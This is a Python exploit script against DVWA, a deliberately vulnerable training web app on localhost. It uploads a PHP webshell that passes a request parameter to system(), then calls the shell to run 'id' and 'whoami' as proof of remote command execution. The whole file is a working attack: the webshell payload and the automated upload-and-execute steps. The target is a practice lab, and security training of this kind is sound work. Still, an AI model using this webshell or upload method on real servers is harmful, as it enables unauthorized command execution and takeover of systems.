
import requests
import re

s = requests.Session()
s.cookies.update({'PHPSESSID': '9f8c8our5hpn5aqrjdbg4k9er5', 'security': 'low'})

# DVWA File Upload vulnerability
url = "http://localhost:28080/vulnerabilities/upload/"

# Create a PHP webshell
webshell_content = """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>"""

# Prepare the file upload
files = {
    'uploaded': ('shell.php', webshell_content, 'application/x-php')
}

data = {
    'Upload': 'Upload'
}

r = s.post(url, files=files, data=data)

if r.status_code == 200:
    print("[+] File upload attempt completed!")
    
    # Check if upload was successful
    if "successfully uploaded" in r.text.lower():
        print("[+] SUCCESS: Webshell uploaded!")
        
        # Try to access the uploaded shell
        # DVWA typically stores uploads in /hackable/uploads/
        shell_url = "http://localhost:28080/hackable/uploads/shell.php?cmd=id"
        print(f"\n[*] Testing webshell at: {shell_url}")
        
        r2 = s.get(shell_url)
        if r2.status_code == 200 and "uid=" in r2.text:
            print("[+] Webshell is active!")
            print("\n[*] Command execution result:")
            print(r2.text)
            
            # Execute another command to demonstrate RCE
            r3 = s.get("http://localhost:28080/hackable/uploads/shell.php?cmd=whoami")
            print("\n[*] Current user:")
            print(r3.text)
        else:
            print("[-] Webshell not accessible or not working")
            print(f"Status: {r2.status_code}")
    else:
        print("[-] Upload may have failed")
        print(r.text[:500])
else:
    print(f"[-] Request failed with status {r.status_code}")

